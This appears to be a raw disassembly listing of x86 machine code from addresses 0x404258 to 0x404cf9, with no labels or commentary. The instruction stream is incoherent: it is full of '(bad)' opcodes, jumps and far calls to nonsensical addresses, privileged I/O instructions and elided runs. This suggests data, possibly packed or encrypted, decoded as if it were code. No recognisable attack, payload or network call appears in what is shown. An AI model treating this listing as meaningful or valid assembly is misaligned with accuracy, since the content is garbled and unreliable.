  404258:	aas    
  404259:	pop    ebx
  40425a:	push   0xffffffbf
  40425c:	inc    edx
  40425d:	pop    eax
  40425e:	jmp    0x999b5066
  404263:	(bad)  
  404265:	pop    edx
  404266:	jmp    0x558096e
  40426b:	call   0x6841c983
  404270:	cmp    eax,0x8282e95c
  404275:	push   esi
  404276:	in     al,0x3
  404278:	ds imul ebp,ecx,0x53
  40427c:	push   esi
  40427d:	jmp    0xdc2c:0xe43e03e9
  404284:	in     al,0x5a
  404286:	mov    esi,0x71
	...
  4042af:	add    BYTE PTR [eax],al
  4042b1:	add    BYTE PTR [edx-0x73],ah
  4042b4:	cmp    al,0xf0
  4042b6:	dec    ecx
  4042b7:	pop    es
  4042b8:	shl    edi,0xcb
  4042bb:	mov    dl,BYTE PTR [ecx-0x16a5c2a3]
  4042c1:	cmp    dl,0x67
  4042c4:	pusha  
  4042c5:	inc    ecx
  4042c6:	lea    edx,es:[eax+ebp*8]
  4042ca:	push   ss
  4042cb:	inc    ebp
  4042cc:	xchg   edx,eax
  4042cd:	add    al,0x3e
  4042cf:	mov    esp,?
  4042d1:	sti    
  4042d2:	sbb    esi,eax
  4042d4:	add    BYTE PTR [ebx+0x21],dh
  4042d7:	lea    ebp,[edx-0x1f]
  4042da:	cmp    cl,BYTE PTR gs:[eax-0x58]
  4042de:	cmp    eax,0x15f1758c
  4042e3:	pop    eax
  4042e4:	std    
  4042e5:	push   esi
  4042e6:	loope  0x404348
  4042e8:	fmul   DWORD PTR [esi+0x6f]
  4042eb:	xchg   edi,edi
  4042ed:	mov    esp,0x3de274d5
  4042f2:	(bad)  [ebx+eiz*1-0x7f91eef]
  4042f9:	cs dec edi
  4042fb:	cmp    edi,0xffffff9c
  4042fe:	mov    ch,0x74
  404300:	or     BYTE PTR [ecx+ebx*4],bl
  404303:	mov    WORD PTR [ebx],fs
  404305:	xor    DWORD PTR [ecx+0x3101ec06],esp
  40430b:	pop    ebx
  40430c:	add    cl,ch
  40430e:	mov    al,ds:0x8911e806
  404313:	mov    edi,?
  404315:	jmp    0x40431a
	...
  40433e:	add    BYTE PTR [eax],al
  404340:	mov    al,ds:0x8b010806
  404345:	xchg   edx,eax
  404346:	jmp    esi
  404348:	hlt    
  404349:	xchg   edi,eax
  40434a:	pop    ebx
  40434b:	mov    al,0x7f
  40434d:	push   edi
  40434e:	add    BYTE PTR [eiz*8+0x624c837e],bh
  404355:	mov    WORD PTR [ebx-0xf],?
  404358:	pusha  
  404359:	push   es
  40435a:	or     cl,dl
  40435c:	add    BYTE PTR [ecx-0x64db1700],0xc9
  404363:	stos   DWORD PTR es:[edi],eax
  404364:	inc    ecx
  404365:	mov    WORD PTR [edx+esi*2+0x11],ss
  404369:	loopne 0x4043b0
  40436b:	icebp  
  40436c:	fild   DWORD PTR ds:[eax]
  40436f:	jmp    0x29aa6eb1
  404374:	add    dl,BYTE PTR [edi+0x582700ea]
  40437a:	leave  
  40437b:	ret    0x581b
  40437e:	push   ebp
  40437f:	mov    eax,ebx
  404381:	sbb    al,0xfc
  404383:	mov    edx,DWORD PTR [edx]
  404385:	nop
  404386:	mov    cl,BYTE PTR [ebp-0xd]
  404389:	js     0x404399
  40438b:	push   ecx
  40438c:	es scas eax,DWORD PTR es:[edi]
  40438e:	add    ch,BYTE PTR [ebx]
  404390:	pop    ss
  404391:	mov    DWORD PTR [ebx+0x3775459],ebp
  404397:	rep lods eax,DWORD PTR ds:[esi]
  404399:	adc    al,0xc9
  40439b:	ret    0x57cf
  40439e:	push   ebp
  40439f:	mov    eax,DWORD PTR [ebx+0x8b571e]
	...
  4043cd:	add    BYTE PTR [edx-0x2574047d],dl
  4043d3:	(bad)
  4043d7:	js     0x4043db
  4043d9:	repz sti 
  4043db:	adc    al,0x5e
  4043dd:	leave  
  4043de:	push   ebp
  4043df:	test   bh,bh
  4043e1:	push   esp
  4043e2:	or     al,0xa4
  4043e4:	push   esi
  4043e5:	push   edi
  4043e6:	or     al,0xb
  4043e8:	or     ah,bh
  4043ea:	sbb    al,0x53
  4043ec:	adc    BYTE PTR [ebx],ch
  4043ee:	push   edi
  4043ef:	adc    DWORD PTR [ebp+0xc],edi
  4043f2:	test   BYTE PTR [eax-0xd],bl
  4043f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043f6:	ins    BYTE PTR es:[edi],dx
  4043f7:	shl    BYTE PTR [ebp+0x1],1
  4043fa:	pop    ss
  4043fb:	push   ss
  4043fc:	pop    esi
  4043fd:	leave  
  4043fe:	xchg   ebp,eax
  4043ff:	xchg   edx,eax
  404400:	call   DWORD PTR [esp+ecx*8-0x4e]
  404404:	add    esp,0xffffff93
  404407:	sbb    al,0x57
  404409:	push   ebx
  40440a:	call   FWORD PTR [eax+0x1]
  40440d:	add    BYTE PTR [edi+0x76],dl
  404410:	jne    0x40441a
  404412:	iret   
  404413:	out    dx,al
  404414:	(bad)  
  404415:	call   eax
  404417:	add    al,0x7d
  404419:	or     BYTE PTR [esi],bh
  40441b:	cmp    DWORD PTR ds:0x42c0c2b,edi
  404421:	add    DWORD PTR [esi],edi
  404423:	je     0x4044a0
  404425:	adc    al,0x54
  404427:	or     al,dl
  404429:	loop   0x404432
  40442b:	(bad)  
  40442c:	data16 or BYTE PTR [ecx+0x41],bh
  404430:	jns    0x4044a7
	...
  40445a:	add    BYTE PTR [eax],al
  40445c:	dec    edx
  40445d:	cmp    bh,BYTE PTR [edi]
  40445f:	(bad)  
  404460:	ds ins DWORD PTR es:[edi],dx
  404462:	mov    ebx,0xffff052b
  404467:	cmp    dh,BYTE PTR [esi-0x7cff1b41]
  40446d:	and    bh,BYTE PTR [edx+0x4]
  404470:	pcmpeqb mm7,QWORD PTR [esi]
  404473:	(bad)  
  404474:	cmp    DWORD PTR [edx],ecx
  404476:	dec    edi
  404477:	(bad)  
  404478:	mov    ah,0x80
  40447a:	sub    DWORD PTR [eax+0x45797d42],ecx
  404480:	mov    cl,0xc
  404482:	add    BYTE PTR [edx],bh
  404484:	jmp    FWORD PTR [esi+esi*1+0x18762c10]
  40448b:	leave  
  40448c:	cwde   
  40448d:	xor    eax,0xe8f5d56f
  404492:	inc    ebp
  404493:	leave  
  404494:	jl     0x404416
  404496:	add    edx,DWORD PTR [ebp-0x4b]
  404499:	mov    BYTE PTR [eax+0x4e4576c4],al
  40449f:	push   edi
  4044a0:	jno    0x4044d1
  4044a2:	cld    
  4044a3:	pop    edx
  4044a4:	mov    ah,0x75
  4044a6:	jnp    0x4044ed
  4044a8:	arpl   si,di
  4044aa:	aas    
  4044ab:	add    esi,eax
  4044ad:	aaa    
  4044ae:	call   0x3d819a3e
  4044b3:	mov    edx,ebx
  4044b5:	jg     0x404473
  4044b7:	inc    ebp
  4044b8:	inc    esi
  4044b9:	je     0x4044be
  4044bb:	add    BYTE PTR [esi],bh
  4044bd:	pop    ebx
  4044be:	jb     0x4044f6
	...
  4044e8:	add    BYTE PTR [eax],al
  4044ea:	dec    esi
  4044eb:	jle    0x404516
  4044ed:	out    0x83,al
  4044ef:	mov    dh,ah
  4044f1:	lods   eax,DWORD PTR ds:[esi]
  4044f2:	jnp    0x40447c
  4044f4:	fisubr WORD PTR [ebp+0x4e714332]
  4044fa:	adc    DWORD PTR [ebx+0x14],ebx
  4044fd:	call   0xe86d163b
  404502:	mov    ah,0x6e
  404504:	mov    cl,0x7b
  404506:	xchg   ebx,eax
  404507:	mov    esi,esi
  404509:	lods   eax,DWORD PTR ds:[esi]
  40450a:	jnp    0x404494
  40450c:	jno    0x40451d
  40450e:	es pop edx
  404510:	lahf   
  404511:	ds loop 0x4044e8
  404514:	mov    ah,0xe4
  404516:	(bad)  
  404517:	outs   dx,BYTE PTR ds:[esi]
  404518:	add    DWORD PTR [edx+0x6b],edi
  40451b:	mov    ch,bl
  40451d:	dec    esi
  40451e:	enter  0xddd4,0x29
  404522:	mov    ch,0x1f
  404524:	xor    DWORD PTR [ebx],esi
  404526:	push   edx
  404527:	dec    ebx
  404528:	es ds mov dh,0x7c
  40452c:	sub    DWORD PTR [ecx+0x3],edi
  40452f:	mov    BYTE PTR [ecx+0x0],ah
  404532:	mov    ah,0x1f
  404534:	or     eax,0xa65bfd7b
  404539:	inc    ebp
  40453a:	cmc    
  40453b:	xchg   ebx,eax
  40453c:	sub    esi,edi
  40453e:	mov    DWORD PTR [esi],ebp
  404540:	(bad)  
  404541:	xlat   BYTE PTR ds:[ebx]
  404542:	mov    edi,0x79e4fd9e
  404547:	mov    DWORD PTR [edx],edi
  404549:	das    
  40454a:	xchg   ebp,eax
  40454b:	xlat   BYTE PTR ds:[ebx]
  40454c:	and    al,0xe0
	...
  404576:	add    BYTE PTR [eax],al
  404578:	push   cs
  404579:	mov    bl,BYTE PTR [esp+ecx*1+0x56]
  40457d:	movnti DWORD PTR [esi+edi*1],eax
  404581:	loopne 0x40452c
  404583:	adc    eax,esi
  404585:	lock jmp 0xca838e
  40458b:	cmp    al,0x32
  40458d:	jae    0x4045d4
  40458f:	mov    bh,0x1d
  404591:	mov    DWORD PTR [ecx+0x7589162c],ecx
  404597:	popf   
  404598:	sbb    al,BYTE PTR [esi-0x17]
  40459b:	jmp    0x160099dd
  4045a0:	popf   
  4045a1:	rol    BYTE PTR [ebp+0x79],cl
  4045a4:	sbb    eax,0x9491f40f
  4045a9:	mov    edi,edi
  4045ab:	jbe    0x404560
  4045ad:	push   ds
  4045ae:	clc    
  4045af:	outs   dx,BYTE PTR ds:[esi]
  4045b0:	xchg   edi,eax
  4045b1:	(bad)  
  4045b2:	(bad)  
  4045b3:	fcom   QWORD PTR ds:0xda597589
  4045b9:	xlat   BYTE PTR ds:[ebx]
  4045ba:	(bad)  
  4045bb:	push   esi
  4045bc:	fisttp QWORD PTR [eax+0x63ea4d75]
  4045c2:	jmp    0x75c883b0
  4045c7:	in     eax,dx
  4045c8:	aad    0x5f
  4045ca:	jmp    0xff6b83b8
  4045cf:	mov    ah,0x49
  4045d1:	(bad)  
  4045d2:	test   DWORD PTR [edi],edx
  4045d4:	pushf  
  4045d5:	mov    bh,bh
  4045d7:	mov    ecx,0x16febe95
	...
  404604:	add    BYTE PTR [eax],al
  404606:	popf   
  404607:	mov    BYTE PTR [ebp+0x15],dh
  40460a:	popf   
  40460b:	push   cs
  40460c:	clc    
  40460d:	je     0x4045d6
  40460f:	jns    0x40460f
  404611:	(bad)  
  404612:	pushf  
  404613:	sub    ebp,eax
  404615:	neg    DWORD PTR [edi+0x16eeff88]
  40461b:	push   ebx
  40461c:	call   0xffc8d875
  404621:	push   ebx
  404622:	cmp    dh,bl
  404624:	sub    esp,DWORD PTR [ecx]
  404626:	sti    
  404627:	pop    edx
  404628:	call   DWORD PTR [edx+ecx*2+0x73]
  40462c:	mov    ebx,0xff7d7d00
  404631:	or     ebx,DWORD PTR [edi-0x770b8a83]
  404637:	and    edi,eax
  404639:	push   DWORD PTR [edx+0x57]
  40463c:	call   0xffbd23ec
  404641:	and    edi,edi
  404643:	jl     0x4046ba
  404645:	clc    
  404646:	mov    edi,0xc8fffdc8
  40464b:	jl     0x4046c2
  40464d:	or     BYTE PTR [edi-0x77000846],ch
  404653:	fld    st(3)
  404655:	pop    ebx
  404656:	ficomp WORD PTR [ebp-0x27adfff8]
  40465c:	in     al,dx
  40465d:	and    DWORD PTR [ebx],0xffffffb0
  404660:	push   edi
  404661:	mov    esp,DWORD PTR [edx+0x3c00a8f]
  404667:	push   edx
  404668:	mov    DWORD PTR [eax],0x0
	...
  404692:	add    BYTE PTR [eax],al
  404694:	out    0x5b,eax
  404696:	add    BYTE PTR [eax],al
  404698:	sub    al,0x7c
  40469a:	cmp    DWORD PTR [ebp-0x21],0x5e
  40469e:	jne    0x4046a7
  4046a0:	dec    ebp
  4046a1:	pop    esp
  4046a2:	add    al,BYTE PTR [eax]
  4046a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046a5:	js     0x4046b6
  4046a7:	sbb    edx,0xffffff83
  4046aa:	add    DWORD PTR [ebp-0x60],esi
  4046ad:	in     eax,0x0
  4046af:	add    DWORD PTR [edi+0x7c02eb5b],edx
  4046b5:	int    0x81
  4046b7:	retf   0x5b9e
  4046ba:	add    al,BYTE PTR [eax]
  4046bc:	sbb    dl,BYTE PTR [ebx]
  4046be:	cld    
  4046bf:	push   eax
  4046c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c1:	cmc    
  4046c2:	(bad)  
  4046c3:	(bad)  
  4046c4:	repnz push edi
  4046c6:	push   DWORD PTR [ebp+0x6f]
  4046c9:	jae    0x40466d
  4046cb:	jmp    0xc04ba227
  4046d0:	ds daa 
  4046d2:	jno    0x404661
  4046d4:	add    ebp,DWORD PTR [edx+0xf3e6a34]
  4046da:	inc    edi
  4046db:	hlt    
  4046dc:	out    dx,al
  4046dd:	sub    eax,DWORD PTR [edi+edi*8]
  4046e0:	retf   
  4046e1:	mov    eax,ds:0x9d3a75e0
  4046e6:	(bad)
  4046ea:	or     al,0xc0
  4046ec:	mov    bl,0x38
  4046ee:	test   DWORD PTR [ebp+0x26],edi
  4046f1:	jne    0x40474a
  4046f3:	inc    esi
  4046f4:	mov    ebp,0x1d857
	...
  404721:	add    BYTE PTR [ebx+0x67d8476],cl
  404727:	je     0x404780
  404729:	cmp    dh,BYTE PTR [ebp-0x71bf23c9]
  40472f:	fadd   QWORD PTR [edx-0x3]
  404732:	icebp  
  404733:	std    
  404734:	mov    eax,?
  404736:	mov    ebx,0x8950dbbf
  40473b:	call   0x1057:0x153e6a03
  404742:	rol    edi,1
  404744:	fucomip st,st(0)
  404746:	jno    0x404773
  404748:	add    al,0x0
  40474a:	xor    eax,0x110a5834
  40474f:	sbb    al,0x29
  404751:	std    
  404752:	mov    cl,0x3d
  404754:	sub    eax,0x8c7895ff
  404759:	inc    ebp
  40475a:	dec    edx
  40475b:	jns    0x404720
  40475d:	je     0x4047a2
  40475f:	push   ebp
  404760:	push   edi
  404761:	clc    
  404762:	shl    DWORD PTR [eax+eiz*8+0x75],0x8a
  404767:	ins    BYTE PTR es:[edi],dx
  404768:	sbb    eax,0x8c743ee9
  40476d:	mov    DWORD PTR [ebp+0x34],0x5bbd1c57
  404774:	fs cld 
  404776:	aas    
  404777:	or     dh,bh
  404779:	mov    ebx,?
  40477b:	bound  ebp,QWORD PTR [ecx]
  40477d:	xor    al,0x59
  40477f:	adc    ch,dh
  404781:	loopne 0x40474e
  404783:	push   0xffffffc6
  404785:	push   esi
	...
  4047ae:	add    BYTE PTR [eax],al
  4047b0:	cmp    al,BYTE PTR [esi+0x3c560c34]
  4047b6:	mov    dh,0xe0
  4047b8:	cmp    DWORD PTR [esi],esp
  4047ba:	mov    al,ds:0x3c5b4ac5
  4047bf:	lea    ebx,[edx]
  4047c1:	fcomp  QWORD PTR [esp+ecx*1]
  4047c4:	aas    
  4047c5:	pop    ebx
  4047c6:	jmp    0x8e94db4e
  4047cb:	push   ss
  4047cc:	std    
  4047cd:	adc    ch,BYTE PTR [eax]
  4047cf:	add    al,0xb9
  4047d1:	pop    ds
  4047d2:	icebp  
  4047d3:	ins    DWORD PTR es:[edi],dx
  4047d4:	ds xchg ah,bh
  4047d7:	idiv   eax
  4047d9:	psubusw mm4,mm0
  4047dc:	imul   edx,DWORD PTR [edi+0x66],0x56
  4047e0:	ss jae 0x404838
  4047e3:	loope  0x4047c6
  4047e5:	test   DWORD PTR [eax],esp
  4047e7:	lds    ebp,FWORD PTR [esi]
  4047e9:	pop    ebx
  4047ea:	add    al,ah
  4047ec:	lds    ebp,FWORD PTR [edx+0x5387e518]
  4047f2:	jmp    0x43ec85fa
  4047f7:	push   esp
  4047f8:	dec    edx
  4047f9:	fdivr  QWORD PTR [ebx]
  4047fb:	adc    cl,ah
  4047fd:	mov    bl,0x25
  4047ff:	sub    BYTE PTR [ebx+ebp*2+0x794ef2f8],0x7
  404807:	mov    dh,BYTE PTR [edx]
  404809:	loopne 0x4047e4
  40480b:	mov    bh,bh
  40480d:	pop    edx
  40480e:	pop    es
  40480f:	ret    
  404810:	adc    esp,DWORD PTR [ecx+0x362a]
	...
  40483e:	mov    ch,0x76
  404840:	add    BYTE PTR [esi-0x9f7e036],bl
  404846:	lods   al,BYTE PTR ds:[esi]
  404847:	sar    DWORD PTR [ebp-0xb],1
  40484a:	mov    ah,0x17
  40484c:	adc    dl,dh
  40484e:	jb     0x40485e
  404850:	sbb    BYTE PTR [edx-0x6e],ah
  404853:	fwait
  404854:	jmp    0x42c6:0x255e2fe1
  40485b:	pop    ebx
  40485c:	add    BYTE PTR [edx+0x36],dh
  40485f:	loopne 0x404891
  404861:	pusha  
  404862:	sbb    DWORD PTR [ebx+0x33],0xffffffab
  404866:	jns    0x4048e1
  404868:	call   0xc9653b0b
  40486d:	stos   DWORD PTR es:[edi],eax
  40486e:	dec    esi
  40486f:	pop    ebx
  404870:	push   ebp
  404871:	bound  ecx,QWORD PTR [esi]
  404873:	sub    DWORD PTR [ebx+0x755b420c],eax
  404879:	out    dx,al
  40487a:	add    BYTE PTR [edi],bl
  40487c:	or     BYTE PTR [eax+0x72],cl
  40487f:	sbb    al,BYTE PTR [eax]
  404881:	push   0x5f
  404883:	push   edi
  404884:	add    ah,dh
  404886:	cmp    BYTE PTR [ebp+eax*2+0x4113a2f5],bl
  40488d:	jmp    0x41485792
  404892:	sar    DWORD PTR [ebp+0x0],cl
  404895:	jmp    0xbd3fec5e
  40489a:	cmp    DWORD PTR [ebx+0x7],esi
  40489d:	inc    esi
  40489e:	cmp    bl,BYTE PTR [ebx+0x3]
  4048a1:	adc    DWORD PTR [eax],eax
	...
  4048cb:	add    ch,bh
  4048cd:	daa    
  4048ce:	call   0xffc4dac1
  4048d3:	jb     0x4048bf
  4048d5:	test   BYTE PTR [ebp-0xf],dh
  4048d8:	ins    BYTE PTR es:[edi],dx
  4048d9:	jae    0x4048ec
  4048db:	push   cs
  4048dc:	inc    edx
  4048dd:	pop    ebx
  4048de:	call   DWORD PTR [ecx+eax*2-0x6eff17d8]
  4048e5:	jge    0x4048e7
  4048e7:	add    BYTE PTR [eax+ebx*4],cl
  4048ea:	pop    ebx
  4048eb:	leave  
  4048ec:	and    eax,0xdc550057
  4048f1:	mov    dl,BYTE PTR [ebx-0x7d]
  4048f4:	loop   0x40494c
  4048f6:	add    BYTE PTR [ebp+0x58],dh
  4048f9:	popf   
  4048fa:	inc    ebp
  4048fb:	or     dh,al
  4048fd:	adc    BYTE PTR [ecx+0x0],al
  404900:	in     al,0xfa
  404902:	or     eax,DWORD PTR [eax]
  404904:	or     bl,BYTE PTR [edi+eax*8+0x45]
  404908:	push   ebx
  404909:	mov    edi,0xa5274148
  40490e:	jne    0x404918
  404910:	(bad)  
  404911:	mov    edx,0xd11700e6
  404916:	fdivr  st,st(7)
  404918:	dec    edx
  404919:	imul   ebp,eax,0xffffffb3
  40491c:	leave  
  40491d:	push   edi
  40491e:	add    BYTE PTR [ebx],al
  404920:	iret   
  404921:	sbb    BYTE PTR [ebx-0x18],dl
  404924:	lods   al,BYTE PTR ds:[esi]
  404925:	mov    al,ds:0xc08cffff
  40492a:	push   DWORD PTR [ebp-0x21]
  40492d:	dec    eax
  40492e:	call   0x4049f0
	...
  404957:	add    BYTE PTR [eax],al
  404959:	add    BYTE PTR [ecx+0xaff0057],bh
  40495f:	push   esp
  404960:	push   ebx
  404961:	call   0x40c703
  404966:	data16 sti 
  404968:	pop    es
  404969:	mov    eax,ds:0x74001e9f
  40496e:	iret   
  40496f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404970:	jne    0x40497a
  404972:	outs   dx,DWORD PTR ds:[esi]
  404973:	mov    ch,0xfb
  404975:	push   DWORD PTR [eax-0x2f]
  404978:	ret    
  404979:	pop    ebx
  40497a:	pop    esi
  40497b:	call   0x83ec:0xd0ea0008
  404982:	pop    ebx
  404983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404984:	push   edi
  404985:	push   0x4773e
  40498a:	ds pop edx
  40498c:	lods   eax,DWORD PTR ds:[esi]
  40498d:	sti    
  40498e:	mov    DWORD PTR [esp+ecx*4+0x45],ebx
  404992:	xor    al,0x1f
  404995:	xlat   BYTE PTR ds:[ebx]
  404996:	add    eax,0xeb0003b3
  40499b:	outs   dx,DWORD PTR ds:[esi]
  40499c:	jmp    0x3e6a:0xe0266916
  4049a3:	sub    BYTE PTR [edi+edi*8],al
  4049a6:	sar    DWORD PTR [ecx+0x69],cl
  4049a9:	add    BYTE PTR [ecx-0x72],dl
  4049ac:	mov    ah,0x4b
  4049ae:	push   DWORD PTR [ecx-0x7a]
  4049b1:	rol    bh,0x49
  4049b4:	fnsave [ebp+0x3a]
  4049b7:	popf   
  4049b8:	imul   edi,ebx,0x45c5b231
	...
  4049e6:	add    BYTE PTR [eax],al
  4049e8:	sub    dh,BYTE PTR [ebp+0x3]
  4049eb:	add    BYTE PTR [esi],bh
  4049ed:	and    DWORD PTR [ecx-0x178b80b5],edi
  4049f3:	sub    eax,0x458889c5
  4049f8:	ss (bad) 
  4049fa:	fdivr  QWORD PTR [edi+0x1]
  4049fd:	add    bl,BYTE PTR [ebx]
  4049ff:	inc    edx
  404a00:	inc    edx
  404a01:	jg     0x4049fb
  404a03:	imul   edi,DWORD PTR [esi],0x8e08421f
  404a09:	lods   al,BYTE PTR ds:[esi]
  404a0a:	and    al,0x4d
  404a0c:	jg     0x404a82
  404a0e:	fdiv   QWORD PTR [edx]
  404a10:	out    0xc0,al
  404a12:	(bad)  
  404a14:	sar    DWORD PTR [ebp-0x3d],1
  404a17:	je     0x404a5c
  404a19:	or     eax,DWORD PTR [edi-0x4]
  404a1c:	aad    0x8c
  404a1e:	add    bh,0x42
  404a21:	cmc    
  404a22:	sbb    al,0x0
  404a24:	sub    esp,DWORD PTR [edx-0x77]
  404a27:	inc    ebp
  404a28:	stos   BYTE PTR es:[edi],al
  404a29:	pop    ebx
  404a2a:	(bad)  
  404a2b:	retf   0x577c
  404a2e:	jmp    0xbab00f69
  404a33:	mov    bl,bh
  404a35:	push   edx
  404a36:	loop   0x4049fb
  404a38:	adc    bl,BYTE PTR [eax+0x69]
  404a3b:	sbb    al,0x3e
  404a3d:	or     bl,dh
  404a3f:	fwait
  404a40:	ds pop ebx
  404a42:	jmp    0x2bd45f4a
  404a47:	or     BYTE PTR [esi],bh
  404a49:	cmc    
  404a4a:	call   0x404ab8
	...
  404a73:	add    BYTE PTR [eax],al
  404a75:	add    BYTE PTR [esi],bh
  404a77:	cmc    
  404a78:	jmp    0xe93588e6
  404a7d:	imul   edi,DWORD PTR [esi+0x4903e95b],0x8
  404a84:	icebp  
  404a85:	jmp    0x404a15
  404a87:	js     0x404a72
  404a89:	add    eax,ebp
  404a8b:	mov    ds:0x77dc402,al
  404a90:	loop   0x404ac2
  404a92:	push   ss
  404a93:	mov    dl,0x8c
  404a95:	add    edi,DWORD PTR [esi]
  404a97:	ret    
  404a98:	call   0x329b88a0
  404a9d:	retf   
  404a9e:	cld    
  404a9f:	push   esi
  404aa0:	jmp    0x72aeffdb
  404aa5:	inc    esi
  404aa6:	ss push esi
  404aa8:	test   eax,0xb1db4357
  404aad:	add    ebp,DWORD PTR [ebx+0x54]
  404ab0:	xor    DWORD PTR [ebx],eax
  404ab2:	ds pop ebx
  404ab4:	jmp    0xe9974783
  404ab9:	fcom   QWORD PTR [ebx+0x53]
  404abc:	inc    ecx
  404abd:	cwde   
  404abe:	fistp  DWORD PTR [edx-0x17]
  404ac1:	add    dh,0x81
  404ac4:	mov    ebp,0xe96a970e
  404ac9:	add    edi,DWORD PTR [esi]
  404acb:	push   edx
  404acc:	add    BYTE PTR [ebp+edi*2+0x51],bl
  404ad0:	mov    dh,0x29
  404ad2:	xchg   esi,eax
  404ad3:	push   edi
  404ad4:	mov    eax,0x5b3de9
  404ad9:	xor    BYTE PTR [eax],al
	...
  404b03:	add    BYTE PTR [edi+0x56],bh
  404b06:	add    BYTE PTR [esi+eax*8+0x6925836e],bh
  404b0d:	hlt    
  404b0e:	call   DWORD PTR [edx-0xe8a7dc3]
  404b14:	gs out 0xe5,al
  404b17:	jmp    0x7600a159
  404b1c:	pop    ss
  404b1d:	sub    edx,DWORD PTR [eax-0x2f]
  404b20:	loopne 0x404aa6
  404b22:	(bad)  
  404b23:	fmulp  st(3),st
  404b25:	pop    ss
  404b26:	cld    
  404b27:	xor    DWORD PTR [edx],ecx
  404b29:	xor    BYTE PTR [ebp-0x33],0x65
  404b2d:	pop    es
  404b2e:	or     cl,dl
  404b30:	jecxz  0x404ba9
  404b32:	add    cl,ch
  404b34:	dec    eax
  404b35:	fwait
  404b36:	jne    0x404b1d
  404b38:	adc    al,0x7
  404b3a:	cld    
  404b3b:	rcr    DWORD PTR [ebp+0x51a6ff85],0x9b
  404b42:	jmp    0x404b2e
  404b44:	enter  0xfc16,0xa0
  404b48:	clc    
  404b49:	push   edi
  404b4a:	add    BYTE PTR [ecx+edi*4],dh
  404b4d:	outs   dx,DWORD PTR ds:[esi]
  404b4e:	push   ebx
  404b4f:	jb     0x404b98
  404b51:	dec    edi
  404b52:	push   0xffffffd9
  404b54:	xor    BYTE PTR [ebx+0x7b],dh
  404b57:	jae    0x404b6e
  404b59:	sub    DWORD PTR [edx-0x17],0xea6a5b5b
  404b60:	push   ebx
  404b61:	pop    ebx
  404b62:	push   0xffffffea
  404b64:	gs pop ebx
  404b66:	add    cl,ch
	...
  404b90:	add    BYTE PTR [eax],al
  404b92:	mov    ebp,0xd5e17580
  404b97:	xchg   esp,esp
  404b99:	add    bh,dl
  404b9b:	pop    esp
  404b9c:	mov    DWORD PTR [ebx],eax
  404b9e:	out    0x10,eax
  404ba0:	pop    esp
  404ba1:	push   0xffffffa7
  404ba3:	dec    esp
  404ba4:	call   0x974dde
  404ba9:	mov    esp,edx
  404bab:	pop    eax
  404bac:	push   0x0
  404bae:	lods   eax,DWORD PTR ds:[esi]
  404baf:	pop    esp
  404bb0:	push   0x0
  404bb2:	mov    ebp,0x38006a56
  404bb7:	push   0x573227e8
  404bbc:	add    BYTE PTR [ebx],cl
  404bbe:	daa    
  404bbf:	sub    ebp,DWORD PTR [edi]
  404bc1:	mov    DWORD PTR [eax+eax*4+0x5cbd0069],esp
  404bc8:	push   0x0
  404bca:	or     eax,0x3fe8505b
  404bcf:	jp     0x404bd1
  404bd1:	add    dh,bl
  404bd3:	sbb    BYTE PTR [eax],cl
  404bd5:	or     edx,DWORD PTR [edi+0x4ff242b]
  404bdb:	pop    ebx
  404bdc:	call   0x9c4f9c
  404be1:	push   DWORD PTR [esp+esi*2]
  404be4:	mov    ah,0xe4
  404be6:	pop    ss
  404be7:	pop    esp
  404be8:	mov    DWORD PTR [ebx],0xffffa4d8
  404bee:	lods   al,BYTE PTR ds:[esi]
  404bef:	push   edx
  404bf0:	push   DWORD PTR [ebx]
  404bf2:	mov    edi,0xe4ba
	...
  404c1f:	add    BYTE PTR [edi],dl
  404c21:	popf   
  404c22:	add    edi,edi
  404c24:	mov    eax,0xa72bffa4
  404c29:	pop    esi
  404c2a:	inc    ebx
  404c2b:	or     al,bl
  404c2d:	or     al,al
  404c2f:	pop    ebx
  404c30:	sahf   
  404c31:	xchg   ebp,eax
  404c32:	or     BYTE PTR [eax],al
  404c34:	mov    ds:0x4c53ecd0,al
  404c39:	inc    ebx
  404c3a:	or     BYTE PTR [ebx+0x74db6d3e],al
  404c40:	xor    DWORD PTR [ecx],edx
  404c42:	push   esi
  404c43:	or     dh,dl
  404c45:	arpl   di,bx
  404c47:	add    BYTE PTR [esi],bh
  404c49:	inc    ecx
  404c4a:	push   esi
  404c4b:	add    al,0xa6
  404c4d:	mov    edi,0x313e00df
  404c52:	push   ss
  404c53:	call   0x439a69
  404c58:	cmc    
  404c59:	dec    edx
  404c5a:	lds    eax,FWORD PTR [esi+edi*1]
  404c5d:	mov    edi,0x35bfec8e
  404c62:	jecxz  0x404c53
  404c64:	sbb    DWORD PTR [eax+0x31],0x42bebd57
  404c6b:	dec    eax
  404c6c:	push   DWORD PTR [ecx+0x3]
  404c6f:	je     0x404cc4
  404c71:	jno    0x404c82
  404c73:	inc    edi
  404c74:	div    BYTE PTR [edx]
  404c76:	add    al,0xe8
  404c78:	mov    edi,0x79ffd97a
  404c7d:	outs   dx,BYTE PTR ds:[esi]
  404c7e:	inc    eax
  404c7f:	dec    eax
  404c80:	push   DWORD PTR [ecx+0x3]
	...
  404cab:	add    BYTE PTR [eax],al
  404cad:	add    BYTE PTR [esi],bh
  404caf:	jb     0x404c35
  404cb1:	cmp    eax,0x434c85
  404cb6:	ds inc eax
  404cb8:	out    dx,eax
  404cb9:	(bad)  
  404cba:	jae    0x404cf5
  404cbc:	dec    esp
  404cbd:	inc    ecx
  404cbe:	ds in  al,dx
  404cc0:	gs stc 
  404cc2:	sbb    esi,ebx
  404cc4:	rol    DWORD PTR ds:0x433c85,0x3e
  404ccb:	je     0x404cd0
  404ccd:	add    BYTE PTR [ebx-0x6102c11],dh
  404cd3:	std    
  404cd4:	xor    ebp,eax
  404cd6:	mov    ds:0xbbffd904,eax
  404cdb:	mul    edi
  404cdd:	out    dx,eax
  404cde:	loope  0x404d3b
  404ce0:	data16 xor al,0xe6
  404ce3:	mov    esp,0xd0d1d959
  404ce8:	lods   al,BYTE PTR ds:[esi]
  404ce9:	xlat   BYTE PTR ds:[ebx]
  404cea:	outs   dx,BYTE PTR ds:[esi]
  404ceb:	repz popf 
  404ced:	dec    ebx
  404cee:	jg     0x404d4b
  404cf0:	rol    DWORD PTR ds:0xec695b3e,1
  404cf6:	push   ds
  404cf7:	js     0x404ce2
  404cf9:	add    esi,DWORD PTR ds:0x57ede9b
